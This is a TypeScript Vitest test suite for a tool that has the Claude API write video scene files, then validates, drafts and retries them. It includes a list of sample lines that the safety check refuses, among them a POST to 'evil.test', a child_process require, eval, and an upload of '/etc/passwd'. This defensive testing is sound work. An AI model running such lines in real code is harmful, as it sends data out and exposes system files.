// showcase auto: the scenes are written through the API, checked, drafted, fixed.
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

// the renderer and the explorer are replaced: these tests are about the loop
const make = vi.fn()
const explore = vi.fn()
vi.mock('../../../src/render/make.ts', async (original) => ({ ...(await original<typeof import('../../../src/render/make.ts')>()), make }))
vi.mock('../../../src/capture/explore.ts', async (original) => ({ ...(await original<typeof import('../../../src/capture/explore.ts')>()), explore }))

const { API_URL, DEFAULT_MODEL, askClaude, auto, extractCode, firstRequest, systemPrompt, unsafeReasons } = await import('../../../src/auto/auto.ts')

const GOOD = `import { defineScenes, hookCard } from 'kwartz-showcase'

export default defineScenes({
  scenes: [{ id: 'hook', say: 'Hello.', motion: ({ theme, sayMs }) => hookCard(theme, { title: 'Hi' }, sayMs) }],
})`
const fenced = (code: string) => `Here is the file.\n\n\`\`\`ts\n${code}\n\`\`\`\n`
const apiReply = (text: string, ok = true, status = 200) => ({ ok, status, text: async () => JSON.stringify(ok ? { content: [{ type: 'text', text }] } : { error: { message: text } }) }) as Response
const result = (advice: string | null = null) => ({ plan: {}, made: [{ format: 'landscape', file: 'out/v.mp4', copies: [], checks: [], advice }], notes: [], palette: null, creditsFile: null })

let dir: string
let config: string
const log = vi.fn()
const sent = () => (fetch as unknown as ReturnType<typeof vi.fn>).mock.calls.map((c) => JSON.parse((c[1] as { body: string }).body) as { model: string; system: string; messages: { role: string; content: string }[] })
const run = (over: object = {}) => auto({ configFile: config, apiKey: 'sk-test', log, ...over })

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'showcase-auto-'))
  config = path.join(dir, 'showcase.config.json')
  fs.writeFileSync(config, JSON.stringify({ name: 'v', url: 'http://localhost:3000' }))
  fs.mkdirSync(path.join(dir, '.showcase', 'explore'), { recursive: true })
  fs.writeFileSync(path.join(dir, '.showcase', 'explore', 'map.md'), '# Product map\n- button "Go": `page.locator(\'#go\')`')
  make.mockReset()
  explore.mockReset()
  log.mockReset()
  make.mockResolvedValue(result())
  vi.stubGlobal('fetch', vi.fn(async () => apiReply(fenced(GOOD))))
  vi.stubEnv('ANTHROPIC_API_KEY', '')
  vi.stubEnv('SHOWCASE_MODEL', '')
})
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }))

describe('extractCode', () => {
  it('takes the file out of its code block', () => {
    expect(extractCode(fenced(GOOD))).toBe(GOOD + '\n')
  })
  it('takes the last block that holds a scenes file', () => {
    const reply = `\`\`\`ts\nconst x = 1\n\`\`\`\nthen\n\`\`\`typescript\n${GOOD}\n\`\`\`\nand\n\`\`\`bash\nshowcase make\n\`\`\``
    expect(extractCode(reply)).toBe(GOOD + '\n')
  })
  it('accepts a reply that is the file with no fence', () => {
    expect(extractCode(GOOD)).toBe(GOOD + '\n')
  })
  it('refuses a reply with no scenes file in it', () => {
    expect(() => extractCode('I cannot do that.')).toThrow(/did not return a scenes file/)
    expect(() => extractCode('```ts\nconst x = 1\n```')).toThrow(/did not return a scenes file/)
  })
})

describe('unsafeReasons', () => {
  const withLine = (line: string) => GOOD.replace('export default', `${line}\nexport default`)
  it('passes a plain scenes file', () => {
    expect(unsafeReasons(GOOD)).toEqual([])
  })
  it('passes the starter file that ships with the kit', () => {
    expect(unsafeReasons(fs.readFileSync(path.resolve('templates/brief/video.ts'), 'utf8'))).toEqual([])
  })
  it('passes the config example', () => {
    expect(unsafeReasons(fs.readFileSync(path.resolve('examples/tour/video.ts'), 'utf8'))).toEqual([])
  })
  it.each([
    ["import fs from 'node:fs'", /imports "node:fs"/],
    ["import { x } from '../secrets.ts'", /imports "\.\.\/secrets\.ts"/],
    ["const cp = require('child_process')", /require\(\)/],
    ["const m = await import('node:os')", /dynamic import/],
    ['const k = process.env.HOME', /touches the process/],
    ["eval('1')", /evaluates code/],
    ["new Function('return 1')()", /evaluates code/],
    ["await fetch('https://evil.test', { method: 'POST' })", /network calls/],
    ['Bun.spawn([])', /runtime directly/],
    ['setTimeout(() => {}, 1000)', /timers/],
    ["await page.route('**', () => {})", /changes how the page loads/],
    ["await page.locator('input').setInputFiles('/etc/passwd')", /uploads files/],
  ])('refuses %s', (line, why) => {
    expect(unsafeReasons(withLine(line)).join('; ')).toMatch(why)
  })
  it('refuses a file that is not a scenes file', () => {
    expect(unsafeReasons("import { defineScenes } from 'kwartz-showcase'\nexport const x = 1")).toEqual(['it does not end with: export default defineScenes({ ... })'])
  })
  it('gives every reason at once', () => {
    expect(unsafeReasons(withLine("import fs from 'node:fs'\nprocess.exit(1)")).length).toBeGreaterThanOrEqual(2)
  })
})

describe('the request', () => {
  const system = systemPrompt({ skill: 'SKILL TEXT', template: 'TEMPLATE TEXT' })
  it('tells the model what the file may and may not do', () => {
    expect(system).toMatch(/only import is from 'kwartz-showcase'/)
    expect(system).toMatch(/Never create, edit or delete/)
    expect(system).toMatch(/Use only selectors that appear in the product map/)
    expect(system).toContain('SKILL TEXT')
    expect(system).toContain('TEMPLATE TEXT')
  })
  it('sends the work order and the map', () => {
    const text = firstRequest('# Work order: v', '# Product map')
    expect(text).toContain('# Work order: v')
    expect(text).toContain('# Product map')
  })
  it('says so when there is no map', () => {
    expect(firstRequest('order', null)).toMatch(/the product was not explored/)
  })
})

describe('askClaude', () => {
  it('posts to the Messages API with the key and the version', async () => {
    await askClaude({ apiKey: 'sk-test', model: 'm', system: 's', messages: [{ role: 'user', content: 'hi' }] })
    const [url, init] = (fetch as unknown as ReturnType<typeof vi.fn>).mock.calls[0] as unknown as [string, { method: string; headers: Record<string, string>; body: string }]
    expect(url).toBe(API_URL)
    expect(init.method).toBe('POST')
    expect(init.headers).toMatchObject({ 'x-api-key': 'sk-test', 'anthropic-version': '2023-06-01', 'content-type': 'application/json' })
    expect(JSON.parse(init.body)).toMatchObject({ model: 'm', system: 's', messages: [{ role: 'user', content: 'hi' }] })
  })
  it('returns the text of the reply', async () => {
    expect(await askClaude({ apiKey: 'k', model: 'm', system: 's', messages: [] })).toBe(fenced(GOOD))
  })
  it('passes on what the API says when it refuses', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => apiReply('invalid x-api-key', false, 401)))
    await expect(askClaude({ apiKey: 'bad', model: 'm', system: 's', messages: [] })).rejects.toThrow('the Claude API answered 401: invalid x-api-key')
  })
  it('never puts the key in an error', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => apiReply('overloaded', false, 529)))
    const e = await askClaude({ apiKey: 'sk-secret-123', model: 'm', system: 's', messages: [] }).catch((x: Error) => x.message)
    expect(e).not.toContain('sk-secret-123')
  })
  it('refuses an empty reply', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => ({ ok: true, status: 200, text: async () => '{"content":[]}' }) as Response))
    await expect(askClaude({ apiKey: 'k', model: 'm', system: 's', messages: [] })).rejects.toThrow(/returned no text/)
  })
})

describe('auto', () => {
  it('needs a key, and says how the rest works without one', async () => {
    await expect(auto({ configFile: config, log })).rejects.toThrow(/ANTHROPIC_API_KEY[\s\S]*\/kwartz-showcase/)
    expect(fetch).not.toHaveBeenCalled()
  })
  it('writes the scenes, drafts, then renders for real', async () => {
    const done = await run()
    expect(fs.readFileSync(path.join(dir, 'video.ts'), 'utf8')).toBe(GOOD + '\n')
    expect(make.mock.calls.map((c) => c[1].draft)).toEqual([true, false])
    expect(done).toMatchObject({ tries: 1, model: DEFAULT_MODEL, scenesFile: path.join(dir, 'video.ts') })
  })
  it('stops after the draft when asked', async () => {
    await run({ draftOnly: true })
    expect(make.mock.calls.map((c) => c[1].draft)).toEqual([true])
  })
  it('uses the model that was asked for, or the one in the environment', async () => {
    await run({ model: 'claude-test-1' })
    expect(sent()[0]!.model).toBe('claude-test-1')
    vi.stubEnv('SHOWCASE_MODEL', 'claude-env-2')
    fs.rmSync(path.join(dir, 'video.ts'))
    await run()
    expect(sent().at(-1)!.model).toBe('claude-env-2')
  })
  it('sends the product map and the work order', async () => {
    await run()
    const first = sent()[0]!.messages[0]!.content
    expect(first).toContain('# Work order: v')
    expect(first).toContain("page.locator('#go')")
    expect(explore).not.toHaveBeenCalled()
  })
  it('explores first when there is no map', async () => {
    fs.rmSync(path.join(dir, '.showcase'), { recursive: true })
    await run()
    expect(explore).toHaveBeenCalledOnce()
    expect(explore.mock.calls[0]![0]).toMatchObject({ url: 'http://localhost:3000' })
  })
  it('will not replace scenes a person wrote, unless told to, and then keeps a copy', async () => {
    fs.writeFileSync(path.join(dir, 'video.ts'), '// mine')
    await expect(run()).rejects.toThrow(/already exists[\s\S]*--force/)
    expect(fetch).not.toHaveBeenCalled()
    await run({ force: true })
    expect(fs.readFileSync(path.join(dir, 'video.ts.before-auto'), 'utf8')).toBe('// mine')
    expect(fs.readFileSync(path.join(dir, 'video.ts'), 'utf8')).toBe(GOOD + '\n')
  })
  it('sends a draft that stopped back with its error, and tries again', async () => {
    make.mockRejectedValueOnce(new Error('render stopped in scene "moved": locator not found')).mockResolvedValue(result())
    const done = await run()
    expect(done.tries).toBe(2)
    const second = sent()[1]!.messages
    expect(second).toHaveLength(3)
    expect(second[2]!.content).toMatch(/render stopped in scene "moved": locator not found/)
    expect(second[2]!.content).toMatch(/choose another from the product map/)
  })
  it('gives up after the allowed tries, and leaves the last file to fix by hand', async () => {
    make.mockRejectedValue(new Error('locator not found'))
    await expect(run({ tries: 2 })).rejects.toThrow(/still fails after 2 attempt\(s\)[\s\S]*video\.ts[\s\S]*locator not found/)
    expect(fetch).toHaveBeenCalledTimes(2)
    expect(fs.existsSync(path.join(dir, 'video.ts'))).toBe(true)
  })
  it('never runs a file that is refused: it asks again, saying why', async () => {
    const bad = GOOD.replace('export default', "import fs from 'node:fs'\nexport default")
    vi.stubGlobal('fetch', vi.fn().mockResolvedValueOnce(apiReply(fenced(bad))).mockResolvedValue(apiReply(fenced(GOOD))))
    await run()
    expect(sent()[1]!.messages[2]!.content).toMatch(/refused and not run, because it imports "node:fs"/)
    expect(fs.readFileSync(path.join(dir, 'video.ts'), 'utf8')).not.toContain('node:fs')
  })
  it('writes nothing when the model keeps returning a file that may not be run', async () => {
    const bad = GOOD.replace('export default', 'process.exit(1)\nexport default')
    vi.stubGlobal('fetch', vi.fn(async () => apiReply(fenced(bad))))
    await expect(run()).rejects.toThrow(/may not be run; nothing was written/)
    expect(fs.existsSync(path.join(dir, 'video.ts'))).toBe(false)
    expect(make).not.toHaveBeenCalled()
  })
  it('asks once for the length to be fixed, in words', async () => {
    make.mockResolvedValueOnce(result('4.9 s too short: add about 14 words of narration, or one scene')).mockResolvedValue(result())
    const done = await run()
    expect(done.tries).toBe(2)
    expect(sent()[1]!.messages.at(-1)!.content).toMatch(/add about 14 words[\s\S]*change only the narration/)
    expect(make.mock.calls.map((c) => c[1].draft)).toEqual([true, true, false])
  })
  it('sends back anything the layout check found cut off or covered', async () => {
    const cut = { ...result(), made: [{ format: 'vertical', file: 'out/v.mp4', copies: [], advice: null, checks: [{ name: 'layout', ok: false, detail: '1 thing(s) cut off, off screen or covered: in "pipeline", the box around "Video" is cut off' }] }] }
    make.mockResolvedValueOnce(cut).mockResolvedValue(result())
    const done = await run()
    expect(done.tries).toBe(2)
    expect(sent()[1]!.messages.at(-1)!.content).toMatch(/in the vertical video, 1 thing\(s\) cut off[\s\S]*the box around "Video"[\s\S]*make it smaller, move it/)
  })
  it('puts back the file that ran when the length fix does not', async () => {
    const longer = GOOD.replace('Hello.', 'Hello there, this is longer.')
    vi.stubGlobal('fetch', vi.fn().mockResolvedValueOnce(apiReply(fenced(GOOD))).mockResolvedValue(apiReply(fenced(longer))))
    make.mockResolvedValueOnce(result('too short')).mockRejectedValueOnce(new Error('broke')).mockResolvedValue(result())
    await run()
    expect(fs.readFileSync(path.join(dir, 'video.ts'), 'utf8')).toBe(GOOD + '\n')
  })
  it('checks the config before it spends anything', async () => {
    fs.writeFileSync(config, JSON.stringify({ url: 'https://app.example.com' }))
    await expect(run()).rejects.toThrow(/"safety.banned" is required/)
    expect(fetch).not.toHaveBeenCalled()
  })
})
